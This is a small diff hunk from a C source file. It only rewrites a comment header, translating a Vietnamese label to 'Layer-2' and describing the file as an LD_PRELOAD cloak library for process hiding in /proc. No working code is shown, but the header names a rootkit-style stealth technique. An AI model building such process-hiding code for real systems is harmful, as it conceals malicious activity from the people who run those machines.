@@ -15,7 +15,7 @@
 
 /* =====================================================
  *  LD_PRELOAD Cloak Library for Proc Filesystem Protection
- *  Tầng-2: Userspace LD_PRELOAD Cloak
+ *  Layer-2: Userspace LD_PRELOAD Cloak for Process Hiding
  * ===================================================== */
 
 /* Constants */
